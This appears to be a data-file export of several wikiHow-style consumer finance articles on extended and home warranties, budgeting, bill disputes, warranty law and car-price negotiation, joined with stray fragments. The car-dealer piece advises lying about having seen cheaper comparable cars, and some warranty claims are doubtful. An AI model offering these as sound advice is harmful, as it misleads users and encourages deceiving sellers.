Check if you are already covered through your payment method.,
Make sure there is a deductible for repairs.,
Look for restrictions or limits on the warranty.,
Determine the reliability of the product.,
Examine the cost of the extended warranty.,
Calculate the most reasonable price for the warranty.,
Avoid extended warranties on new, expensive products.,
Go for an extended warranty for used products.,
Consider an extended warranty for a home purchase.,
Take your time before buying extended warranty.",How to Know if You Should Buy the Extended Warranty," Start by reading over the warranty that already comes with the product, often for free. Most free warranties last for 12 months or one year. They usually cover normal wear and tear and the maintenance of the product based on the manufacturer’s guidelines. This could include cleaning and maintaining the product as well as replacing damaged parts.For example, a warranty for an electronic product, like a laptop or phone, should cover drops and spills. It should also cover the cost of replacing damaged parts.
A warranty for a new car should cover repairs for 12 months. The types of repairs covered will depend on the warranty and the condition of the car.
A warranty for a home appliance, like a refrigerator, should cover damages and repairs for up to 12 months.;
, In some instances, if you pay for a product with your credit card, you may already get a warranty for the product. This will depend on your credit card company and the type of credit card you have. If this is the case, you may not need an extended warranty.


Often if you pay for products with cash or debit, you will not get any other warranty offers for the product. In this case, it may be a good option to get an extended warranty.

, A good warranty will offer deductibles for repairs, making it cheaper for you when you need the product to be repaired. Depending on the warranty, you may be able to get a deductible on all your repairs or most of your repairs.If there is no deductible for repairs in your existing warranty, you may want to get an extended warranty to cover these. However, most trustworthy manufacturers offer deductibles for repairs.

, Identify any restrictions or limits on the warranty that may be an issue for you. For example, if you plan to own the product for many years and are worried about repairs being covered, the 12 month coverage period of the existing warranty may not be enough for what you need. But if you are planning to trade in or sell the product within the warranty time, you may not go for an extended warranty.You should also find out if the warranty is transferable if you sell the product to someone else. Most manufacturers allow this as long as the product is sold within the coverage time of the warranty.

, An extended warranty is often a good idea if you feel the product may not be reliable and are worried about paying more than you should for repairs or damages after the existing warranty is over. Research the reliability of the product to determine if it will last and work well beyond the coverage time of the existing warranty. If not, you may want to consider an extended warranty.Do research online by looking at reviews of the product. Note if reviewers are recommending on investing in the extended warranty or if they feel comfortable just having the existing warranty.
Go over the specs of the product and note the quality of the parts. If the product does not look sturdy or trustworthy, you may invest in an extended warranty.

, You should also factor in the cost of the product and the cost of the extended warranty. If the warranty is more than 20 percent of the product’s price, it may cost too much and not be worth getting. Instead you may actually save money by paying for repairs and damages out of pocket, if they are ever needed.Avoid extended warranties that are close to half the cost of the product’s retail price. Most repairs and damages for products will be cheaper than half the cost of the product.

, You should also consider if the warranty is worth investing in based on the likelihood that the product will break down. Consider how reliable the product is and then calculate the most reasonable price for an extended warranty based on the failure rate of the product.For example, let's say you buy a $1,000 TV that has a 4 in 100 rate of failure. If you multiple the rate times the price (.04 x $1,000), you would get $40, which means the most you should pay for an extended warranty for the TV is $40.

, Expensive consumer products bought new, like refrigerators, washing machines, televisions, and stereos, are often reliable and do not usually break down. If they do break down, it is often during the coverage period of the existing warranty.Try not to let your emotions dictate the purchase of an extended warranty. Often people buy extended warranties because they are worried the product will fail and end up feeling guilty for not getting more warranty coverage. This may not be a smart move if the product is expensive and known to be reliable.

, If you are buying a used product, such as a used car, you may invest in an extended warranty. There is an increased risk when buying a used car, so the piece of mind and coverage of an extended warranty may be worth it for you.If you do decide to get the extended warranty for a used car, always make sure it is affordable and that it will cover you for a long period of time, such as five to seven years. This way, any damages or repairs you need are covered during this time.

, Getting an extended warranty for the purchase of a home may be a good idea, especially if the home is older and has dated appliances. You may opt for a lifetime warranty for specific things in the home, such as windows or appliances, particularly if you know you are going to need to replace them in the near future.Make sure the warranty can be used more than once to address any damages or repairs. This way, you won’t have to pay for issues out of pocket, especially if they are recurring, like faulty appliances or damaged windows.
If you do not think the extended warranty for your home is worth the investment, or is too expensive for you, you may opt for having a savings account for home repairs instead to cover these costs.

, Most retailers will offer extended warranties right as you are buying the product and may pressure you to decide whether to get one in the moment. Take a step back and delay the decision until you can think about it. Most retailers will actually allow you to add an extended warranty to a product before your existing warranty expires or within a certain time frame. Find out what the window of time for getting an extended warranty is and think on it before you buy it.For example, some car sellers will allow you to add an extended warranty to the car up to right before your existing warranty expires or you hit a certain number of miles.
Some electronics sellers allow you to add an extended warranty within 30 days to a year of buying an electronic device.

Review your bank statements. Find out how much of your money goes into the bank and for what, other than your monthly bills, it comes out.
Go through your monthly bills. You should know exactly whom you pay each month, for what, and how much you pay them.
Scrutinize your credit card statements. Learn how much you pay on your cards each month, what your total balance is, and how you use your cards.
Track your loans. Know how much you owe and how long it will take to pay if off making the regular monthly payment each month.

Obtain a copy of your credit report and read it. You are entitled to one free copy each year from each of the three credit reporting agencies. To get your free copy online now, visit http://www.annualcreditreport.com.;
, Financial responsibility is easier when you are working towards a goal. Decide to remodel the bathroom, purchase a new vehicle, or upgrade your television set. It does not matter what your goal is, just that it is something you want for which you will have to save.

, Once you know how much money you have coming in and going out, and you have a financial goal, you will need to develop a budget that allows you to save towards your goal. To develop a budget that you can stick with:


Keep a record of your monthly spending for several months. Include groceries, gasoline, clothing, lunches and dinners out, dry cleaning, school expenses, etc. You want to be sure that your record is an accurate picture of how you spend your money.
Write a spending plan using your spending record as a guide, eliminating unnecessary expenses, and decreasing those, which may be too high.
Revise your budget as necessary. When monthly bills change or are eliminated, your financial goals become different, or your income increases or decreases, a change in the budget is necessary. Your budget must be flexible in order for you to stick with it.

, Generally, one spouse is in charge of the finances, but that is no excuse for the other to not know where the money goes, and be involved in financial decisions. You do not have to know where every dime your spouse spends goes, nor does he or she need to know where every dime you spend goes, but you should both be aware of your financial situation and be involved in the big financial decisions.

, Not all debt is created equal. Here is how to tell the good debt from the bad debt:


Debt, which creates value and helps you to build wealth is good debt. The most common example of good debt is a mortgage. The value of the home increases as the amount of the debt decreases and you build equity in the home. School loans are also considered good debt because of the potential value of a degree you earn acquiring the debt.
Debt, which continues to increase, as the item purchased with it decreases, is bad debt. Credit cards are the number one bad debt among consumers. The items purchased on the card decrease in value, while the interest you are charged on them increases each month you do not pay off the credit card. Car loans are also bad debt because the value of the car decreases more quickly than the principle of the loan.

, There should be more money coming in than there is going out. Oftentimes, simple things people do or do not do, throws that balance out of whack without them realizing it.


Living on credit. Charging merchandise to credit cards or taking out loans to purchase large ticket items is not living within your means. If you are not living within your means, you are incurring bad debt, which may dig you into a financial hole, of which you cannot get out.
Not setting financial goals. It may not sound like a huge mistake to not have a financial goal, but if you have no real reason to manage your money well, you are not as likely to do it. A financial goal will give you something to look forward to and work towards.
Calling luxuries items necessities.

, Look for organizations in your community that can help you learn more about personal finance, with articles, activities, and classes.


Places to check for information include banks or credit union, nonprofit housing organizations, employee assistance programs, and religious organizations.
You may also want to check with your local college or university to see if they offer personal finance or economic classes you can take.

, Even when using information found on the internet, the same basic rules apply.

, Even when using information found on the internet, the same basic rules apply.


Reliable sources of information include colleges and universities, federal and state governments, well known national organizations, such as the National Cancer Society, and articles published in professional journals and peer-reviewed publications. Many reliable websites end in .gov, .org, or .edu. This generally indicates that the site is a government entity, non-profit organization, or educational institution.
Unreliable sources of information most often come from self-published mediums, such as blogs, personal websites, social networking sites, internet forums, and unknown organizations. As a general rule, if a well-known expert did not write it or a well-known entity publish it, it is unreliable information.

It even offers games and simulations for children; to get them started learning about personal finance early. Visit the website at http://www.federalreserveeducation.org.

Compare the cost of the warranty to the odds that you will need it.",How to Determine an Extended Warranty's Worth," In most cases, the manufacturer's warranty will include a year or more of coverage. In addition, a retailer might add their own warranty on top of that. Check with the retailer and read your included warranty papers to understand the extent of the warranties provided to you with a purchase. With these covering two or even three years, you may realize that an extended warranty is unnecessary.You may be covered even further by your credit card provider. Certain Visa, MasterCard, and all American Express cards offer extended warranties for purchase. Check your card agreement for details.;
, Some warranties cover parts only or labor only. Read the fine print and weigh warranty specifics against the product. If everything is covered, then it might be worth purchasing. Only you can determine what may be necessary to cover. Whatever the terms, make sure you get the details in writing should you choose to purchase it.For example, if you are buying a television and you plan on having it for as long as possible, you may want to purchase a warranty if it covers parts and labor, because that alone can get expensive.
However, if the television already comes with some form of warranty and the extended warranty only covers labor, then it may not be worth the additional payment.

, Some extended warranties come with stipulations about servicing or repairing the product. For example, you may have to have it repaired at a certified location or have it serviced after certain periods of time. In this case, make sure that the required service is reasonable for you, both in cost and distance. If not, the warranty may be impractical., Check on extra coverage in the extended warranty, such as transferrable coverage. This will allow you to transfer the warranty to another person in the event that you sell the product. Look for this provision if you think you might have to sell the item in question or want to upgrade in the near future., Depending on your specific warranty, it may be difficult to actually file a claim, even if your item's damage is covered. First, you'll have to locate the provider of the insurance, which might be a third-party if you purchased your item from a larger retailer. Then, you'll likely have to locate your receipts and warranty papers before contacting the provider. After this effort, it still may take weeks or longer for your claim to be processed, if it ever is.


Look in the warranty rules for information about providers. Then, look for reviews of the provider online. If the claims process seems convoluted or the provider is poorly-rated, the warranty may not be worth the hassle.Read the fine print to see if there are any other costs associated with claims. For example, parts may be covered while labor and shipping are not., Read what others are saying. Find out whether the product is known to break down or if it needs servicing frequency. If so, then consider a warranty. If not, then decide if you think it is worth the risk not to get an extended warranty. Try to find specific information about the reliability of that product or the chance that such a product will be damaged over the warranty period.


For example, research has shown that a smartphone has a one-in-three chance of being damaged over three years. Depending on your risk tolerance, this might be a high enough risk to make a warranty worth it.
Other products, like home appliances, are much less likely to break over their warranty periods.Try looking at product review websites, like Consumer Reports, to get information on product reliability., This is a subjective decision based on the product itself and your experience with the product. For example, you may feel that the product is a name brand with a good reputation and so it doesn't need a warranty. Or maybe you are a particular type of person who would be attentive and careful when using the product, as you have been with similar products, and therefore there will be no need to cover it. Only you can make this decision.Allow your past experience to be a determining factor. If you have made a similar purchase in the past and paid for a warranty unnecessarily, then decide if you want to do it again. Measure the risk of not getting a warranty and decide whether it will be a costly mistake.

, If you know you will likely upgrade the device or product in a few years anyway, there is no reason to purchase a warranty. This may not apply to furniture, vehicles, or appliances, but many electronics will be outdated in several years. Plus, electronic devices are generally more expensive to repair than to replace due to the complex nature of their construction. Make sure to consider whether or not you'd want a replacement copy of the same device in a few years, or if you'll just upgrade instead, before buying a warranty., For a very expensive item or one necessary to your work, the extended warranty may be worth purchasing just for peace of mind. However, try to leave your emotions out of your decision. Perform calculations for the potential cost of replacement or repairs and compare that to the warranty cost to make an informed decision. Otherwise, you risk throwing money away to protect yourself from something that will likely never happen., A well-priced warranty should cost a small percentage of the product's original cost. If the cost of the warranty is more than 15 to 20 percent of the product cost, then it may not be worth it. At this point, you can always look for extended warranties from other third parties, rather than just buying the retailer's option. These other companies may offer more affordable coverage., Sometimes it just makes more sense to replace the product. For example, an iron or a coffee machine may not deserve a warranty, whereas a fridge or oven probably would. Think about whether you could pay to replace the product if absolutely necessary. If the product is necessary to your life or work, but you couldn't easily pay to replace it, a warranty may be necessary.


For example, the average person couldn't pay to replace their home, so they buy homeowners insurance. However, a warranty for a $200 television is not necessary for most people., Read user reviews and forum posts online about the product to see what the average repair costs are like. Look for common issues and the amount paid to repair them. You can then use this information to construct an idea of what it might cost to repair a product if you need to. Compare this information to the cost of the warranty to determine whether or not the warranty is worthwhile., The most objective way to measure the value of a warranty is to compare its cost against that of potential repairs or replacement. Combine your research on the odds of product failure, repair costs, and replacement cost to figure out a monetary amount of risk. For example, imagine you have a $1,000 appliance with a 15 percent chance of total failure within three years. This would represent $150 in potential replacement costs.


If the warranty is less than this cost, it is a good deal. If it is more, you should consider just taking the risk and paying for repairs if needed."

Examine your bill carefully.,
Compare your bill to your own records.,
Contact the company that sent the bill.,
Make copies of supporting documents or receipts.,
Search for sample letters.,
Use standard business format.,
Enter the header information.,
Identify the bill you are disputing.,
Explain why you believe the bill is incorrect.,
Close your letter.,
Attach evidence.,
Mail your letter.,
Wait for notice of receipt of your letter.,
Give the company time to investigate the dispute.,
Evaluate the response from the billing company.,
Follow up as necessary.,
Get any agreement in writing.,
Consider filing a complaint.",How to Dispute a Bill," If you find an incorrect amount on your bill, take note of the date on the bill and look for any information regarding the company's dispute procedure.


If you don't send the company notice of your dispute within a certain period after the date on the bill, you lose many of the protections available to you under state or federal law. For example, to use certain protections available under federal law for credit card disputes, you must notify the company of your dispute in writing within 60 days of the date on the bill.The bill may include a phone number or address you should use if you have a dispute about the bill. If the company has its own particular dispute process, this may be explained as well.;
, If you see an unfamiliar amount or an entry you believe is in error, your own receipts or other documents may clarify the situation.


If you end up filing a formal dispute with the billing company, you also will need to provide copies of any documents you have that support your claim.

, Before you start a formal dispute, talk to a representative to make sure it isn't a simple clerical error.


In some cases, an obvious error can be corrected over the phone in a few minutes without needing to go to the effort of sending a written dispute letter.
If any action is taken on your account to correct the error, ask for written confirmation of that action. You may need proof later if the account is reviewed by someone else.

, If the bill actually is incorrect, you'll need copies of whatever evidence you have to prove the correct amount (if any) you should have been charged – don't send the originals, as you may never get them back.


In some situations it may be difficult to find evidence to support your position, especially if you're trying to prove a negative. For example, if there's a charge on your credit card bill for dinner at a restaurant where you've never eaten, there's no way to document that you didn't eat that meal. However, you may have other receipts that prove you were somewhere else at the time.

, Many government departments and consumer protection agencies have sample letters available on their websites which you can use as guides.The type of bill you're disputing may dictate the information your letter must contain. For example, if you're disputing a credit card bill, you must include your account number, the specific bill, a statement that you dispute that bill, and the reasons for that dispute., Typically whatever word processing application you use will have a template available for a traditional business letter.


Generally, your letter should be printed on white or ivory letter-size paper with standard margins and font size. Lines should be single-spaced with a double-space between paragraphs., At the top of the letter, you should include your name and address as well as the name and address of the company to which you're sending the letter.You also should date your letter. If you want to use a subject line, include your account number and the reference number or date of the bill you wish to dispute.Since you typically won't have the name of the person to whom you're writing, use a standard salutation such as ""To Whom It May Concern,"" or ""Dear Sir or Madam."", Include your account number, if any, along with the date on the bill so the company can retrieve it from its records.If the transaction itself that you're disputing has a reference number, you should include that as well. Otherwise, simply include details about the date and description of the transaction.
You also might consider attaching a copy of the bill with the incorrect entry or amount circled.

, The company will need to know the reason for your dispute.Keep your explanation brief and stick to the facts. For example, if a transaction for $300 appears on your bill, but the purchase itself only totaled $30, you could state ""The entry on your bill indicates I owe $300 for items purchased, but I only purchased $30 worth of items at that store on that date. I have attached a copy of my original receipt for the purchase.""

, Your closing paragraph should reference the copies you've attached and thank the reader for their attention to the matter.


For example, to reference your attachments, you might write ""Attached please find a copy of the disputed bill with the incorrect items circled, as well as a copy of the original receipt indicating the correct purchase amount.""
If there's a specific resolution you desire, such as having the amount corrected or having the charge removed from your account, state this clearly.Try to keep your tone respectful and professional, yet cordial. Don't express anger or threaten complaints or legal action.
Leave space for your signature, then type your name along with any contact information.You may want to include your phone number or email address if you'd prefer the company contact you that way rather than mailing you a letter. However, don't forget to request formal written confirmation of any such communication you have regarding your dispute.

, If you have any documents indicating the correct amount of the bill, sharing those with the company will enable a quicker resolution to your dispute.For example, if you have a receipt that shows a different total amount for the transaction in question than the amount listed on your bill, a copy of that receipt supports your claim that the bill is in error and should be corrected.
You may wish to list titles of these documents at the bottom of your letter as enclosures.This way the company can keep track of all the documents that should be kept with your letter after it's received.
When you've completed and signed your letter, make at least one copy of your letter and all the documents you attached so you have it for your records., Using certified mail or a private carrier that provides tracking so you'll know when the company has received notice of your dispute.


Make sure you're using the correct address for billing inquiries or disputes. The company may have several different addresses for different departments, such as customer service and sales. You may not be able to invoke legal protection if you send your notice to the wrong department.For certain types of bills, you gain certain protections under state or federal law if you dispute the bill promptly. For example, if you're disputing a credit card transaction, the company cannot legally close your account for nonpayment or seek collection of the disputed amount until the dispute is resolved., If you had the ability to track your letter's delivery, you'll get proof of the date when the company received it; however, the company also may be required by law to notify you of receipt.


For example, if your billing dispute is with a credit card company, federal law requires the company to acknowledge your dispute within 30 days of the date it receives your written notice., Once the company receives your letter, it may take a few weeks to hear back regarding the outcome.


If your dispute is with a credit card company, they have two billing cycles (or 90 days maximum) to either correct your account or explain why your dispute has been rejected.Typically, you don't have to pay the disputed amount while the company is investigating your claim. However, you remain responsible for any undisputed amounts, so if the bill includes both disputed and undisputed amounts, you should go ahead and pay the undisputed portion to avoid any fees or penalties., If the billing company determines the bill was incorrect, you won't be responsible for the disputed amount.


Although you may receive a phone call, typically the billing company is required by law to respond to your dispute in writing. The company may correct the error in whole or in part.If the company investigates and doesn't find enough evidence to justify changing the amount you disputed, it must send you a written explanation as to why your dispute is being rejected., You may need to appeal the decision to a higher authority within the company or take additional steps to get the result you want.


You typically can request information or documentation from the company if it investigated your dispute and determined that your bill was correct.If the company investigates and determines that you owe all or part of the charge you disputed, you generally must pay that amount promptly to avoid additional fees or penalties.
In the meantime, you may choose to escalate your dispute to higher levels of the company itself or to a third party or the courts. Keep in mind that although you may choose to continue fighting your dispute, not paying the disputed charges after the company has rejected it may result in fees or increased interest on your account. If you ultimately win your dispute, these charges would be removed from your account., Even if you're able to resolve your dispute over the phone, a written confirmation of the agreement provides proof it was made.


In some cases, state or federal law may require the company to send you confirmation of the resolution of your dispute in writing. For example, federal law requires a credit card company to send you written notice of its decision regarding your dispute and the action to be taken on your account within 90 days., If you're unable to resolve the dispute to your satisfaction, you might be able to get a better result from a consumer protection agency.


For example, if you have a billing dispute regarding a credit card, vehicle loan or lease, mortgage, or other financial service, you can file a complaint with the Consumer Financial Protection Bureau.This federal agency was created to assist consumers and help ensure fairness in financial transactions.In the case of a bill you received from a merchant or other private business, you also might want to file a complaint with the Better Business Bureau or with your local chamber of commerce describing your dispute.

Do your research!!!,
Go to the dealer with CASH if you can.,
Before you even test drive the car, set a price-point in your head of how high you want to go.,
Don't seem too interested in the car.,
Remember, don't get emotionally attached to the car, and be willing to walk away if the price gets too high.

,
Whether you know anything about cars or not, take a look at the engine.,
When test driving the car, and while looking at it, find any problems at all.,
Start your dealing magic!,
The dealer will probably say he wants more for that, bring your price up just a bit.,
Stay strong on your offer.,
Just remember, folks, stay strong.",How to Talk a Car Dealer Down on Price," Find out the Blue Book value of the car you want to buy at www.kbb.com. Also, don't be afraid to check Craigslist and other classifieds to see how much similar cars are going for.;
, Dealers are much more likely to go down in price if you have cash.

, Tell yourself, I will not go over X amount of dollars.

, Play it cool. Say that it's alright, but it's not your favorite car out there. If you keep talking about how much you love that car, or how you've always wanted that type of car, the dealer knows he has you--hook, line, and sinker.

,, It at least makes it look like you know what you're doing.

, Whether it be, the brakes feel like they need some work. Or the interior needs a good cleaning, or the car has a few scratches and dings. Use these 'issues' to negotiate price with the dealer.

, A general rule of thumb, is to put your first offer so that your highest price point is at the middle of your offer and the dealer price. For instance, if the dealer wants to sell the car for $3,500: and you don't want to spend more than $3,000--put your first offer in at $2,500. Bring up of the 'issues' you found while looking at the car, and say that's why you want to have your price so low. Bring up the KBB value of the car, and say that you've seen other comparable cars for less (even if you haven't).

, Don't budge too much, but don't low-ball the dealer.

, If the dealer won't meet your price-point, say it's more than you wanted to spend, and that you know you can find a similar car for a better price-- be willing to walk away. Remember, there are always other cars out there. And, sometimes, if the dealer sees that you will walk away, he will match your offer. After all, they love to make their sales.

, Remember the two most important rules: don't get attached to the car, and prepare yourself to walk if the price gets too high.

Examine coverage limits and buy what you need.",How to Get the Most Out of Home Warranties," Learn what the policy covers and what it does not. Do not rely on oral statements that may have come from a sales representative or advertising from the website. In the end, the written contract will determine your coverage., Your policy will not generally cover you for appliances that are improperly installed. If you choose to install something yourself, follow all instructions carefully and comply with any building codes. If you hire a professional, check for licensing and bonding. You may also wish to check with the Chamber of Commerce or Better Business Bureau before hiring someone., You cannot count on using your home warranty plan to make repairs on preexisting problems. If a service provider determines that the problem existed before the start date of your policy, the company is likely to deny your claim., You are expected to keep your appliances and home systems well maintained to prevent any serious breakdowns. You should keep a record of routine maintenance and repair work. This can help you if you need to file a claim at some time., Your policy should contain a section that itemizes exclusions. These are all the items that the policy does not cover. You need to make yourself aware of these to avoid filing claims that will not be allowed.Common exclusions are going to include:Spas, pools or hot tubs.
Outdoor water (sprinkler) systems.
Some second appliances, such as air conditioners or freezers.
Septic tank pumping.
Central air conditioning.

, Read your plan or contact a representative of the company to find out how to submit a claim when necessary. You should find out if the company has an emergency contact number for you to call, particularly during off-hours. Keep that information readily available.For example, one warranty company, American Home Shield, posts a toll-free telephone number on its website and has an online link to schedule a service call. They report that 98% of all calls are dispatched within 24 hours.
Most warranty companies will require you to contact them before calling an individual repair company. If you skip this step, your claim may be denied., Most policies require you to use service providers on an approved list that is provided by the company. Be sure you know who the approved providers are and keep the list available in case of an emergency need., Just as you do with most medical insurance plans, you probably have to pay a deductible or copayment for each service call. Understand the requirements of your plan and be prepared for this charge., When first visiting your home, a technician will investigate the problem. The technician may be able to give you a decision about warranty coverage right away or may have to contact the company. You should get a decision about warranty coverage very quickly., Review your plan carefully and understand its requirements. You need to know that your claims will be honored. You shouldn’t be surprised by filing a claim and finding out that it violates the policy for some reason and will not be paid. Some common reasons for claim denial include pre-existing conditions, improper installation, or failure to follow contractual service procedures., Your home warranty policy is intended to protect you for accidents or failures with properly installed and maintained items. If it turns out that your water heater was improperly installed, for example, your home warranty company may deny the claim., Home warranty policies cover usual use, but if you have something in your home that you use much more than most people, the company could challenge a claim. If you have concerns, you should contact the company to ask about the details., If you buy a house in which the previous owner performed some private unlicensed work -- installing wiring, for example -- you might find that a later claim could be denied. Before buying a policy, you should check over all systems and make sure they comply with building codes.If you have concerns, most companies will be willing to have a technician inspect your home before you buy a policy. While this inspection might point out bad news, it will help you avoid a later emergency that might not be covered.

, If a claim is denied, you should not just accept the initial answer as final. Contact the company and ask to speak with a customer service manager. Have your policy available and demand a clear statement regarding the reason for denial. The warranty company should be able to give you a specific reference to your contract plan to explain the denial., In most states, home warranty companies are supervised by the state insurance board. If you are not satisfied with the warranty company’s explanation of the denial, contact your state’s insurance board to file a complaint or investigate further actions you can take., Visit its website at www.homeservicecontract.org to submit a complaint. The NHSCA has an interest in maintaining satisfaction with its member companies. They do not intervene in your particular complaint. However, they will ensure that your complaint is referred to the appropriate people at the warranty company. This can help you get attention to your claim.To submit a complaint, visit www.homeservicecontract.org, and then follow the ""Menu"" link to the page ""For Homeowners."" From there, you will be prompted to enter the details of your complaint.
Provide as much specific information as possible about the date of your service call, the problem you experienced, and the company's unsatisfactory response.

, If you search on the Internet, you can find several independent rating programs that provide consumer information about home warranty companies. Review these rating programs carefully. Look for warranty companies that service your area. Compare the items covered by the various warranty programs. You need to know that you are reviewing comparable programs.For example, the website www.consumeraffairs.com contains information on the top twenty most reviewed home warranty companies. You can find names, addresses, phone numbers and websites, along with customer reviews.
The site www.homewarrantyreviews.com provides general information about home warranty programs as well as customer reviews, prices, Better Business Bureau ratings, and other information.

, The National Home Service Contract Association (NHSCA) is a nonprofit organization of home contract providers. At its website, www.homeservicecontract.org, you can find links to its member organizations and search for warranty providers in your area. The NHSCA also provides informative articles about home warranties and warranty providers., Home warranty programs provide different levels of coverage. Before you can compare prices, review the policies to make sure you are comparing equal programs. For example, a warranty program that covers your heating system as well as your major appliances would naturally cost more than a program that covers your heating system alone.For example, at AngiesList.com, home warranty programs are divided into three categories: basic, enhanced, and optional. As you include more in the program, your price will increase. Be sure you are comparing equal programs as you compare prices.

, When you choose a company for a home warranty program, you are indirectly choosing the plumbers, contractors and other service providers that the warranty program works with. You should choose a warranty company that has a large enough range of service providers to give you flexibility when you need to get work done. More providers means that you are likely to receive faster service when you need it.Investigate whether the service providers a company uses are always licensed.

, Home warranty plans do not automatically just cover full repair or replacement costs. Read your plan carefully and know how much coverage you can expect. You can select different levels of coverage for different purchase prices.For example, you could buy a warranty plan that provides a $500 cap on coverage for your water heater. If you water heater needs some simple service, this might be fine. But if the entire system breaks down and needs to be replaced, you may not be covered.
Most companies offer standard coverage packages and then option add-ons. Investigate the options that might serve your needs. For example, specific items like an automatic garage door opener or a central vacuum system may not initially be included in a home warranty package but could be optional add-ons.

These laws are meant to protect consumers and ensure that they are able to be educated purchasers. A written warranty must meet the following requirements:


Written in plain and easily understandable language.
Provide the name and address of the company giving the warranty.
Detail the product or parts covered by the warranty.
Specify whether the warranty provides replacement, repair, or a complete refund.
Set forth the duration of the warranty, including when the warranty begins.
Explain any things that the warranty does not cover, such as certain types of damage.
Describe any dispute resolution procedures.
Provide information about the consumer’s legal rights.;
, Generally, before making a large purchase, consumers will research the product to determine whether it meets their needs. Consumers should also read the warranties offered with each product that they are considering. Manufacturers provide warranty information online for consumers to review., When reviewing a warranty, the first thing that you should check is how long the warranty lasts. A written warranty will specify when the warranty begins, which is often the date that you purchase the product. When deciding between different products, consider whether one product has a much longer warranty. This should be a factor in deciding which product to purchase.There is no set warranty for all products. You should determine what is the standard warranty for the product you are purchasing.
You can figure out the standard warranty length by reviewing several different warranties for similar products.

, It is important to understand who is responsible for repairing your product should it break while under warranty. You should consider whether it is convenient for you to return the product to a manufacturer or seller. If you have to send the product in for repairs, your warranty should specify who pays for shipping costs. You also want to look closely at how the company will respond if the product breaks. For example, check whether the company repairs the product, replaces it, or refunds your purchase price., The most important part of the warranty is what the warranty actually covers. When comparing different warranties, you want to determine whether the warranty only covers certain types of repairs or parts and if there are any problems that are excluded from coverage. When evaluating a warranty’s coverage, consider the following:


Would you be required to pay for shipping? This could prove very expensive if the warranty is for a heavy piece of machinery.
Does the warranty cover “consequential damages,” such as the cost to replace food when the freezer breaks?
Are there any conditions or limitations on the warranty? Warranties may be void if you fail to use the product as intended or if you attempt to fix the product yourself., You should also look at who is offering the warranty and evaluate whether the company has a good reputation. You can easily search for the company’s name online and look for reviews of its warranty service. If you see repeated complaints about the company, you may want to consider choosing a product with a different warranty service.You can check whether any complaints have been filed against the manufacturer or other business offering the warranty at the Better Business Bureau (BBB)., When you are making a major purchase, many sellers will also try to sell you an extended warranty, which is also known as a service contract. Unlike warranties that come with the product, you have to pay an additional fee for an extended warranty. It is important to evaluate whether the extended warranty provides you any additional coverage, the extent of that coverage, and weigh the cost of the warranty against the likelihood of repairs., Before spending a significant amount of money on an extended warranty, you should determine whether it is likely that the product will need to be repaired. Go online and read reviews about the product. If it is unlikely that the product will need to be repaired before you are ready to buy a new product, you should not waste your money on an extended warranty.


You should also evaluate the cost of typical repairs. If the product may need to be repaired but it is generally not that expensive to repair it, you may want to forego the warranty.
However, if the repairs tend to be very expensive, you may want to consider purchasing the extended warranty.
You want to buy a reliable product from a reputable company in order to decrease the likelihood that you will need repairs., Before you purchase an extended warranty, you want to make sure that it actually gives you more coverage than the original warranty. Most original warranties last for about twelve months or less. Make sure that the extended warranty begins to run after the original warranty expires.


If the warranties run at the same time, make sure that the extended warranty provides additional and necessary protection.
For example, if the original warranty does not cover damage or loss for dropping the product or spilling water on the product, make sure that the extended warranty does, especially if you are prone to dropping or damaging the product., If an extended warranty costs more than 20% of the purchase price of the product, you should consider not purchasing the warranty. If the cost is closer to 50% of the purchase price of the product, you should not purchase the warranty. Most yearlong warranties will cover many of the problems that will arise with a new electronic device. If the product breaks after a year, you may be better off using the money you would have spent on an extended warranty towards the purchase price of a new product., While it is important to review the specifics of each extended warranty, there are certain products for which you should be more or less inclined to buy an extended warranty. For example, most expensive new consumer electronics such as stereos, refrigerators, and big-screen televisions are generally reliable and it may not be worth spending money on an extended warranty. However, under certain circumstances you should consider purchasing an extended warranty, such as:


When you purchase previously owned products, such as a car. There is definitely an increased risk that you will purchase a used car that requires repairs and it may be cost effective to purchase an extended warranty.
If you buy an older home with dated appliances, you may want to consider purchasing a home warranty. This provides you coverage if anything breaks within the first year or so that you own the home.
If purchasing an extended warranty will provide you piece of mind after a major purchase, you should consider getting the extended warranty.
Make sure that you review the warranty coverage and that you don’t pay more than 10 to 20% of the purchase price., An express warranty is made when a seller, manufacturer, or document affirmatively tells you something about the product or promises something about the product when the product is being sold to you. For example, if a seller tells you that you can return something for 60 days for a full refund, this constitutes an express warranty.


Express warranties can be written or oral. However, oral warranties are much more difficult to prove.
You may have to show that you relied on the promise when you made the purchase.
The seller does not have to use the words “promise” or “guarantee” in order to make an express warranty.
Express warranties may be in the form of an advertisement or certificate that he seller relied on in making the purchase., In addition to a written or express warranty, almost all consumer products also come with implied warranties. These warranties guarantee that the product is fit for the purpose for which it is being sold and that it will work as the manufacturer or seller claims. There are two common types of implied warranties: the warranty of merchantability and the warranty of fitness for a particular purpose.


The warranty of merchantability means that the product will do what the seller or manufacturer says it will do. For example, a toaster will toast bread.
The warranty of fitness for a particular purpose applies if you rely on the seller’s advice when purchasing a product for a particular use. For example, if you explain that you need a bike rack to hold two mountain bikes and the seller tells you that a particular rack will work with you car, then you have an implied warranty of fitness for a particular purpose.
You should be aware that some sellers will sell products “as is” to avoid making any implied warranties.
However, certain states such as Kansas, Maine, Maryland, Massachusetts, Mississippi, Vermont, West Virginia, and the District of Columbia, do not allow “as is” sales., When purchasing a product, the claim that it comes with a “lifetime warranty” may be very appealing to you. However, lifetime warranties rarely live up to what their name suggest. When reviewing a lifetime warranty, it is important to read the fine print that comes with the warranty. This will tell you how long a “lifetime” under the warranty actually lasts and what parts of the product are actually covered.


Some lifetime warranties only cover the product for as long as the item is being sold and the warranty ends when the product is discontinued.
Some lifetime warranties are limited to certain parts, a certain period of time or to certain types of damage.
Some lifetime warranties are limited to defects but do not include normal wear and tear."

It's not guaranteed to work, because the banks don't compile the names of their contacts themselves. Instead, they just take whatever names the credit reporting agencies give them and send mail to those addresses.


No one would blame you if you didn't want to fool with this again, but you might make a little more headway if you let the bank know that you're considering filing a complaint with the Consumer Financial Protection Bureau (CFPB) or the Better Business Bureau (BBB).
Be sure to contact the bank issuing the offer and not the credit card company. Even though Acme Bank might be offering you a Visa credit card, it's still Acme that's making the offer and is thus responsible for the mail.

